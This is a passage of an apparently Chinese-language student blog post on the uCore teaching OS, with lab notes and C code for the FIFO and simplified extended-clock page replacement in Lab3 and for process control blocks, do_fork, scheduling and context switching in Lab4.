class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span><br>_fifo_map_swappable(struct mm_struct *mm, <span class="hljs-keyword">uintptr_t</span> addr, struct Page   *page, <span class="hljs-keyword">int</span> swap_in)<br>&#123;<br>    <span class="hljs-keyword">list_entry_t</span> *head=(<span class="hljs-keyword">list_entry_t</span>*) mm-&gt;sm_priv;<br>    <span class="hljs-keyword">list_entry_t</span> *entry=&amp;(page-&gt;pra_page_link);<br><br>    assert(entry != <span class="hljs-literal">NULL</span> &amp;&amp; head != <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-comment">//record the page access situlation</span><br>    <span class="hljs-comment">/*LAB3 EXERCISE 2: YOUR CODE*/</span><br>    <span class="hljs-comment">//(1)link the most recent arrival page at the back of the pra_list_head qeueue.</span><br>    list_add_before(head, entry);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span><br>_fifo_swap_out_victim(struct mm_struct *mm, struct Page ** ptr_page, <span class="hljs-keyword">int</span> in_tick)<br>&#123;<br>     <span class="hljs-keyword">list_entry_t</span> *head=(<span class="hljs-keyword">list_entry_t</span>*) mm-&gt;sm_priv;<br>         assert(head != <span class="hljs-literal">NULL</span>);<br>     assert(in_tick==<span class="hljs-number">0</span>);<br>     <span class="hljs-comment">/* Select the victim */</span><br>     <span class="hljs-comment">/*LAB3 EXERCISE 2: YOUR CODE*/</span><br>     <span class="hljs-comment">//(1)  unlink the  earliest arrival page in front of pra_list_head qeueue</span><br>     <span class="hljs-comment">//(2)  assign the value of *ptr_page to the addr of this page</span><br>     <span class="hljs-keyword">list_entry_t</span> *le = head-&gt;prev;<br>     assert(head!=le);<br>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Page</span> *<span class="hljs-title">p</span> =</span> le2page(le, pra_page_link);<br>     list_del(le);<br>     assert(p !=<span class="hljs-literal">NULL</span>);<br>     *ptr_page = p;<br><br>     <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure></li><li><p>如果要在ucore上实现”extended clock页替换算法”请给你的设计方案，现有的swap_manager框架是否足以支持在ucore中实现此算法？如果是，请给你的设计方案。如果不是，请给出你的新的扩展和基此扩展的设计方案。并需要回答如下问题</p><ul><li>现有的swap_manager框架可以支持在ucore中实现此算法，具体见<strong>扩展练习1</strong>。</li><li>需要被换出的页的特征是什么？<ul><li><code>PTE_P</code>(Present)和<code>PTE_D</code>(Dirty)位均为0。</li></ul></li><li>在ucore中如何判断具有这样特征的页？<ul><li>获取线性地址所对应的页表项，之后使用位运算判断<code>PTE_P</code>和<code>PTE_D</code>。</li></ul></li><li>何时进行换入和换出操作？<ul><li>缺页时换入。</li><li>物理页帧满时换出，不过需要注意dirty bit的处理。可以在修改dirty的时候写入外存，或者可以在最终要删除该物理页时再写入外存。后者有利于多个写操作的合并，降低缺页代价，但此时的页替换算法却退化成普通的clock算法，而不是extended clock算法了。</li></ul></li></ul></li></ul><h3 id="challenge1"><a href="#challenge1" class="headerlink" title="challenge1"></a>challenge1</h3><ul><li><p>需要注意的是extended clock算法会修改dirty bit, 但是swap.c中的swap_out()函数直接把<code>_fifo_swap_out_victim()</code>通过参数返回的page写入到磁盘swap分区中, <strong>根本不管有没有修改过</strong>, 或许可以改进</p></li><li><p>改进的时钟算法会修改dirty bit的原因可能是让被修改过的页面停留在内存中的时间更长, 因为要经过更多次的遍历才能被置换出</p></li><li><p>我寻思把PTE_D and PTE_A结合起来遍历到了就减一也没啥特别的, 而且下一次进入错误处理例程指针还是按照上次的接着继续(如果严格按照PPT上的话), 按别人的做法还要遍历三次当前swappable的页面, 遍历一次记录第一次遇到的00,10,11不就成了, 减少一点微不足道的写回时间(好像没有</p></li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span><br>_extend_clock_swap_out_victim(struct mm_struct *mm, struct Page **ptr_page, <span class="hljs-keyword">int</span> in_tick)<br>&#123;<br>    <span class="hljs-keyword">list_entry_t</span> *head = (<span class="hljs-keyword">list_entry_t</span> *)mm-&gt;sm_priv;<br>    assert(head != <span class="hljs-literal">NULL</span>);<br>    assert(in_tick == <span class="hljs-number">0</span>);<br>    <span class="hljs-comment">//在head双向链表中从头开始遍历, 两个数字代表PTE_A PTE_D组成两位的样子</span><br>    <span class="hljs-comment">//用三个指针取第一次遍历到的page, 00优先级最高</span><br>    <span class="hljs-keyword">list_entry_t</span> *le = head-&gt;next, *_00 = <span class="hljs-literal">NULL</span>, *_10 = <span class="hljs-literal">NULL</span>, *_11 = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">while</span> (le != head)<br>    &#123;<span class="hljs-comment">//只需遍历一次</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Page</span> *<span class="hljs-title">page</span> =</span> le2page(le, pra_page_link); <span class="hljs-comment">//字面意思</span><br><br>        <span class="hljs-keyword">pte_t</span> *ptep = get_pte(mm-&gt;pgdir, page-&gt;pra_vaddr, <span class="hljs-number">0</span>);<br>        assert(ptep != <span class="hljs-literal">NULL</span>);<span class="hljs-comment">//写着意思一下, 也不知有啥用</span><br>        <span class="hljs-keyword">if</span> (!(*ptep &amp; PTE_A))<br>        &#123;<span class="hljs-comment">//遇到第一个00就可以直接break了, 受害者就是你!</span><br>            _00 = le;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<span class="hljs-comment">//剩下两种情况不能break(为了不写的更复杂</span><br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!(*ptep &amp; PTE_D) &amp;&amp; _10 == <span class="hljs-literal">NULL</span>)<br>            _10 = le;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (_11 == <span class="hljs-literal">NULL</span>)<br>            _11 = le;<br>        le = le-&gt;next;<br>    &#125;<br>    le = _00 != <span class="hljs-literal">NULL</span> ? _00 : (_10 != <span class="hljs-literal">NULL</span> ? _10 : _11);<span class="hljs-comment">//根据优先级选一个不为零的</span><br>    *ptr_page = le2page(le, pra_page_link);<span class="hljs-comment">//把受害者的page赋值给这东西</span><br>    list_del(le);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>成了, 简化了一下没有什么用的改进时钟算法, 只要一次甚至不用完全的一次遍历即可做到相同效果, 还通过了fifo的检查, 有这么巧吗</p><blockquote><p>想了一下, 我这快简化成FIFO了, 而改进的时钟置换算法的优势在于<strong>相近的</strong>多次遍历之中, 被写过的页面可以在内存中驻留更久的时间</p><p>坑不填了, 问题就是这个意思没有很复杂</p></blockquote><h3 id="challenge2"><a href="#challenge2" class="headerlink" title="challenge2"></a>challenge2</h3><p>暂时不写</p><h1 id="Lab4"><a href="#Lab4" class="headerlink" title="Lab4"></a>Lab4</h1><h2 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h2><h3 id="0-项目组成-1"><a href="#0-项目组成-1" class="headerlink" title="0.项目组成"></a>0.项目组成</h3><p>相对与实验三，实验四中主要改动如下：</p><ul><li>kern/process/ （新增进程管理相关文件）<ul><li>proc.[ch]：新增：实现进程、线程相关功能，包括：创建进程/线程，初始化进程/线程，处理进程/线程退出等功能</li><li>entry.S：新增：内核线程入口函数kernel_thread_entry的实现</li><li>switch.S：新增：上下文切换，利用堆栈保存、恢复进程上下文</li></ul></li><li>kern/init/<ul><li>init.c：修改：完成进程系统初始化，并在内核初始化后切入idle进程</li></ul></li><li>kern/mm/ （基本上与本次实验没有太直接的联系，了解kmalloc和kfree如何使用即可）<ul><li>kmalloc.[ch]：新增：定义和实现了新的kmalloc/kfree函数。具体实现是基于slab分配的简化算法 （只要求会调用这两个函数即可）</li><li>memlayout.h：增加slab物理内存分配相关的定义与宏 （可不用理会）。</li><li>pmm.[ch]：修改：在pmm.c中添加了调用kmalloc_init函数,取消了老的kmalloc/kfree的实现；在pmm.h中取消了老的kmalloc/kfree的定义</li><li>swap.c：修改：取消了用于check的Line 185的执行</li><li>vmm.c：修改：调用新的kmalloc/kfree</li></ul></li><li>kern/trap/<ul><li>trapentry.S：增加了汇编写的函数forkrets，用于do_fork调用的返回处理。</li></ul></li><li>kern/schedule/<ul><li>sched.[ch]：新增：实现FIFO策略的进程调度</li></ul></li><li>kern/libs<ul><li>rb_tree.[ch]：新增：实现红黑树，被slab分配的简化算法使用（可不用理会）</li></ul></li></ul><h3 id="1-重要数据结构-link"><a href="#1-重要数据结构-link" class="headerlink" title="1.重要数据结构[link]"></a>1.重要数据结构<a href="https://chyyuu.gitbooks.io/ucore_os_docs/content/lab4/lab4_3_2_pcb.html">[link]</a></h3><blockquote><p>这次的<a href="https://chyyuu.gitbooks.io/ucore_os_docs/content/lab4/lab4_3_1_lab_steps.html">实验指导书</a>真绝, 写的是没法比那个好了, 就写点自己领悟到的流程吧</p></blockquote><p>为了管理系统中所有的进程控制块，uCore维护了如下全局变量（位于<em>kern/process/proc.c</em>）：</p><ul><li><code>static struct proc *current</code>：当前占用CPU且处于“运行”状态进程控制块指针。通常这个变量是只读的，只有在进程切换的时候才进行修改，并且整个切换和修改过程需要保证操作的原子性，目前至少需要屏蔽中断。可以参考 switch_to 的实现。</li><li><code>static struct proc *initproc</code>：本实验中，指向一个内核线程。本实验以后，此指针将指向第一个用户态进程。</li><li><code>static list_entry_t hash_list[HASH_LIST_SIZE]</code>：所有进程控制块的哈希表，proc_struct中的成员变量hash_link将基于pid链接入这个哈希表中。</li><li><code>list_entry_t proc_list</code>：所有进程控制块的双向线性列表，proc_struct中的成员变量list_link将链接入这个链表中。</li></ul><p>PCB好像有所简化:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">proc_state</span> &#123;</span><br>    PROC_UNINIT = <span class="hljs-number">0</span>,  <span class="hljs-comment">// 未初始化的     -- alloc_proc</span><br>    PROC_SLEEPING,    <span class="hljs-comment">// 等待状态       -- try_free_pages, do_wait, do_sleep</span><br>    PROC_RUNNABLE,    <span class="hljs-comment">// 就绪/运行状态   -- proc_init, wakeup_proc,</span><br>    PROC_ZOMBIE,      <span class="hljs-comment">// 僵死状态       -- do_exit</span><br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">context</span> &#123;</span>  <span class="hljs-comment">// 保存的上下文寄存器，注意没有eax寄存器和段寄存器</span><br>    <span class="hljs-keyword">uint32_t</span> eip;<br>    <span class="hljs-keyword">uint32_t</span> esp;<br>    <span class="hljs-keyword">uint32_t</span> ebx;<br>    <span class="hljs-keyword">uint32_t</span> ecx;<br>    <span class="hljs-keyword">uint32_t</span> edx;<br>    <span class="hljs-keyword">uint32_t</span> esi;<br>    <span class="hljs-keyword">uint32_t</span> edi;<br>    <span class="hljs-keyword">uint32_t</span> ebp;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_struct</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">proc_state</span> <span class="hljs-title">state</span>;</span>          <span class="hljs-comment">// 当前进程的状态</span><br>    <span class="hljs-keyword">int</span> pid;                        <span class="hljs-comment">// 进程ID</span><br>    <span class="hljs-keyword">int</span> runs;                       <span class="hljs-comment">// 当前进程被调度的次数</span><br>    <span class="hljs-keyword">uintptr_t</span> kstack;               <span class="hljs-comment">// 内核栈</span><br>    <span class="hljs-keyword">volatile</span> <span class="hljs-keyword">bool</span> need_resched;     <span class="hljs-comment">// 是否需要被调度</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_struct</span> *<span class="hljs-title">parent</span>;</span>     <span class="hljs-comment">// 父进程ID</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span>;</span>           <span class="hljs-comment">// 当前进程所管理的虚拟内存页，包括其所属的页目录项PDT</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">context</span> <span class="hljs-title">context</span>;</span>         <span class="hljs-comment">// 保存的上下文</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">trapframe</span> *<span class="hljs-title">tf</span>;</span>           <span class="hljs-comment">// 中断所保存的上下文</span><br>    <span class="hljs-keyword">uintptr_t</span> cr3;                  <span class="hljs-comment">// 页目录表的地址</span><br>    <span class="hljs-keyword">uint32_t</span> flags;                 <span class="hljs-comment">// 当前进程的相关标志</span><br>    <span class="hljs-keyword">char</span> name[PROC_NAME_LEN + <span class="hljs-number">1</span>];   <span class="hljs-comment">// 进程名称（可执行文件名）</span><br>    <span class="hljs-keyword">list_entry_t</span> list_link;         <span class="hljs-comment">// 用于连接list</span><br>    <span class="hljs-keyword">list_entry_t</span> hash_link;         <span class="hljs-comment">// 用于连接hash list</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><h3 id="2-流程"><a href="#2-流程" class="headerlink" title="2.流程"></a>2.流程</h3><ul><li>首先肯定是<code>proc_init()</code>:</li></ul><p><img src="../../image/ucore/image-20211224212029857.png" alt="image-20211224212029857"></p><ul><li><p>首先初始化一下<code>proc_list</code>和<code>hash_list</code>, 然后调用<code>alloc_proc()</code>来通过<code>kmalloc()</code>获取一个proc_struct的空间, 以及略微初始化一下第0个内核线程idleproc(指把状态设成PROC_UNINIT, pid设成-1等等)</p></li><li><p>接着真正初始化一下各个字段的值, 其中kstack直接设置成内核栈bootstack(前面给过出处, 内核栈总共8KB), 弄成current</p></li><li><p>接着调用kern_thread来创建第1个内核线程</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">kernel_thread(<span class="hljs-keyword">int</span> (*fn)(<span class="hljs-keyword">void</span> *), <span class="hljs-keyword">void</span> *arg, <span class="hljs-keyword">uint32_t</span> clone_flags)<br>&#123;<span class="hljs-comment">//三个参数为init_main, &quot;Hello World!&quot;, 0</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">trapframe</span> <span class="hljs-title">tf</span>;</span><br>    <span class="hljs-built_in">memset</span>(&amp;tf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(struct trapframe));<br>    tf.tf_cs = KERNEL_CS;<br>    tf.tf_ds = tf_struct.tf_es = tf_struct.tf_ss = KERNEL_DS;<br>    tf.tf_regs.reg_ebx = (<span class="hljs-keyword">uint32_t</span>)fn;<br>    tf.tf_regs.reg_edx = (<span class="hljs-keyword">uint32_t</span>)arg;<br>    tf.tf_eip = (<span class="hljs-keyword">uint32_t</span>)kernel_thread_entry;<br>    <span class="hljs-keyword">return</span> do_fork(clone_flags | CLONE_VM, <span class="hljs-number">0</span>, &amp;tf);<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li>用局部变量在栈上保存trapframe, 全部设置成内核的段和栈</li><li>注意eip, 设置成了四行汇编的入口及退出代码, 效果相当于c语言main函数之前的准备函数</li><li>随后调用do_fork()进行线程的创建(主要根据trapframe)</li></ul></li><li><p>kern_thread中的do_fork()</p><ul><li><p>分配并初始化进程控制块（alloc_proc函数）</p></li><li><p>分配并初始化内核栈（setup_stack函数）,调用alloc_pages()分配2个(即<code>KSTACKPAGE</code>)page</p></li><li><p>根据clone_flag标志复制或共享进程内存管理结构（copy_mm函数）</p></li><li><p>设置进程在内核（将来也包括用户态）正常运行和调度所需的trapframe和执行context (<strong>copy_thread</strong>函数)</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">copy_thread</span><span class="hljs-params">(struct proc_struct *proc, <span class="hljs-keyword">uintptr_t</span> esp, struct trapframe *tf)</span> </span>&#123;<br>    <span class="hljs-comment">//在内核堆栈的顶部设置中断帧大小的一块栈空间</span><br>    <span class="hljs-comment">//这个减一就很灵性, 因为tf在栈上占据了空间, 所以栈指针下移</span><br>    proc-&gt;tf = (struct trapframe *)(proc-&gt;kstack + KSTACKSIZE) - <span class="hljs-number">1</span>;<br>    *(proc-&gt;tf) = *tf; <span class="hljs-comment">//拷贝在kernel_thread函数建立的临时中断帧的初始值</span><br>    proc-&gt;tf-&gt;tf_regs.reg_eax = <span class="hljs-number">0</span>;<span class="hljs-comment">//设置子进程/线程执行完do_fork后的返回值</span><br>    proc-&gt;tf-&gt;tf_esp = esp; <span class="hljs-comment">//设置中断帧中的栈指针esp,因为我们复制了内存,直接使用父进程esp即可</span><br>    proc-&gt;tf-&gt;tf_eflags |= FL_IF; <span class="hljs-comment">//使能中断</span><br>    <br>    proc-&gt;context.eip = (<span class="hljs-keyword">uintptr_t</span>)forkret;<span class="hljs-comment">//由调度器中的switch_to把这个push到栈上再ret来恢复执行</span><br>    <span class="hljs-comment">//这个proc-&gt;tf和esp有什么关系? 其实fork执行完后子进程仍然处于内核中中断处理例程的状态(由context决定)</span><br>    <span class="hljs-comment">//如果父进程刚好有一个wait, 那么就会调度子进程执行, 也就是执行fork_ret从中断退出以继续执行用户进程</span><br>    proc-&gt;context.esp = (<span class="hljs-keyword">uintptr_t</span>)(proc-&gt;tf);<br>&#125;<br></code></pre></div></td></tr></table></figure></li><li><p>把设置好的进程控制块放入hash_list和proc_list两个全局进程链表中</p></li><li><p>自此，进程已经准备好执行了，把进程状态设置为“就绪”态；</p></li><li><p>设置返回码为子进程的id号。</p></li><li><p>此时可知init_proc的中断帧如下所示, 控制块记录着该线程的一切必要信息, 在内核态设置好了内核栈以及其上的trapframe, 如果是用户程序(应该在下一个实验中)只需执行一下中断返回的流程即可</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//所在地址位置</span><br>initproc-&gt;tf= (proc-&gt;kstack+KSTACKSIZE) – <span class="hljs-keyword">sizeof</span> (struct trapframe);<br><span class="hljs-comment">//具体内容</span><br>initproc-&gt;tf.tf_cs = KERNEL_CS;<br>initproc-&gt;tf.tf_ds = initproc-&gt;tf.tf_es = initproc-&gt;tf.tf_ss = KERNEL_DS;<br>initproc-&gt;tf.tf_regs.reg_ebx = (<span class="hljs-keyword">uint32_t</span>)init_main;<br>initproc-&gt;tf.tf_regs.reg_edx = (<span class="hljs-keyword">uint32_t</span>) ADDRESS of <span class="hljs-string">&quot;Helloworld!!&quot;</span>;<br>initproc-&gt;tf.tf_eip = (<span class="hljs-keyword">uint32_t</span>)kernel_thread_entry;<br>initproc-&gt;tf.tf_regs.reg_eax = <span class="hljs-number">0</span>;<br>initproc-&gt;tf.tf_esp = esp;<br>initproc-&gt;tf.tf_eflags |= FL_IF;<br></code></pre></div></td></tr></table></figure></li></ul></li><li><p>然后从kern_init()中永真循环的cpu_idle进入调度函数<strong>schedule</strong>(), 是很简单的FIFO, 注意要保证调度操作的atomicity, 即屏蔽中断, IF置零</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// cpu_idle - at the end of kern_init, the first kernel thread idleproc will do below works</span><br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">cpu_idle</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>      <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>          <span class="hljs-keyword">if</span> (current-&gt;need_resched) &#123;<br>              schedule();<br>          &#125;&#125;&#125;<br></code></pre></div></td></tr></table></figure><p><img src="../../image/ucore/image-20211224232536016.png" alt="image-20211224232536016"></p><ol><li>设置当前内核线程current-&gt;need_resched为0； <strong>(?</strong> </li><li>在proc_list队列中查找下一个处于“就绪”态的线程或进程<code>next</code>； </li><li>找到这样的进程后，就调用proc_run函数，保存当前进程current的执行现场（进程上下文），恢复新进程的执行现场，完成进程切换。</li></ol></li><li><p>proc_run比较重要:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">proc_run</span><span class="hljs-params">(struct proc_struct *proc)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (proc != current) &#123;<br>        <span class="hljs-keyword">bool</span> intr_flag;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_struct</span> *<span class="hljs-title">prev</span> =</span> current, *next = proc;<br>        local_intr_save(intr_flag); <br>        &#123;<br>            current = proc;<br>            load_esp0(next-&gt;kstack + KSTACKSIZE);  <span class="hljs-comment">//在TSS中的ring0栈顶指针</span><br>            lcr3(next-&gt;cr3);<span class="hljs-comment">//这实际上是完成进程间的页表切换；</span><br>            switch_to(&amp;(prev-&gt;context), &amp;(next-&gt;context));<br>        &#125;<br>        local_intr_restore(intr_flag);<br>&#125;&#125;<br></code></pre></div></td></tr></table></figure><ul><li>switch()比较特别,因为两个参数都是在内存中,然而并不能从内存直接读取到内存, 只能通过一段汇编来把prev的context通过%eax做媒介存入相应寄存器中, 这样context就建立完成了, 注意到eip被设置成forkrets, 就是在trap.S里的一段汇编, 而且重用了以前的代码</li><li><strong>调度完成后先执行forkret, 从栈上弹出entry的地址(和ebp等一起包含在tf中), 然后再执行用户的主函数fn(在这里是initmain)</strong> </li></ul></li><li><p>随后<strong>进程执行完毕后</strong>就返回到kernel_tread_entry函数，并进一步调用<strong>do_exit</strong>执行退出操作了。本来do_exit应该完成一些资源回收工作等，但这些不是实验四涉及的，而是由后续的实验来完成。</p></li></ul><h2 id="练习-1"><a href="#练习-1" class="headerlink" title="练习"></a>练习</h2><h3 id="练习1-1"><a href="#练习1-1" class="headerlink" title="练习1"></a>练习1</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// alloc_proc - alloc a proc_struct and init all fields of proc_struct</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> struct proc_struct *</span><br><span class="hljs-function"><span class="hljs-title">alloc_proc</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_struct</span> *<span class="hljs-title">proc</span> =</span> kmalloc(<span class="hljs-keyword">sizeof</span>(struct proc_struct));<br>    <span class="hljs-keyword">if</span> (proc != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">memset</span>(proc, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(struct proc_struct));<br>        proc-&gt;state = PROC_UNINIT;<br>        proc-&gt;pid = <span class="hljs-number">-1</span>;<br>        proc-&gt;cr3 = boot_cr3;<br>    &#125;<br>    <span class="hljs-keyword">return</span> proc;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>请说明proc_struct中<code>struct context context</code>和<code>struct trapframe *tf</code>成员变量含义和在本实验中的作用是啥？</p><ul><li>context的含义很简单, 就是该线程的上下文即必要的控制流信息, 作用是在proc_run()函数中调用的switch(汇编label)保存当前执行的线程, 然后恢复next线程的context</li><li>tf一开始在kern_thread中作为局部变量存在栈上, 设置好从中断返回(通过iret)时的控制流后调用do_fork(), 在do_fork中的copy_thread复制tf到新线程, 至此完成任务</li></ul><h3 id="练习2-1"><a href="#练习2-1" class="headerlink" title="练习2"></a>练习2</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* do_fork -     parent process for a new child process</span><br><span class="hljs-comment"> * @clone_flags: used to guide how to clone the child process</span><br><span class="hljs-comment"> * @stack:       the parent&#x27;s user stack pointer. if stack==0, It means to fork a kernel thread.</span><br><span class="hljs-comment"> * @tf:          the trapframe info, which will be copied to child process&#x27;s proc-&gt;tf</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">do_fork</span><span class="hljs-params">(<span class="hljs-keyword">uint32_t</span> clone_flags, <span class="hljs-keyword">uintptr_t</span> <span class="hljs-built_in">stack</span>, struct trapframe *tf)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> ret = -E_NO_FREE_PROC;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_struct</span> *<span class="hljs-title">proc</span>;</span><br>    <span class="hljs-keyword">if</span> (nr_process &gt;= MAX_PROCESS)<br>    &#123;<br>        <span class="hljs-keyword">goto</span> fork_out;<br>    &#125;<br>    ret = -E_NO_MEM;<br>    <span class="hljs-comment">//    1. call alloc_proc to allocate a 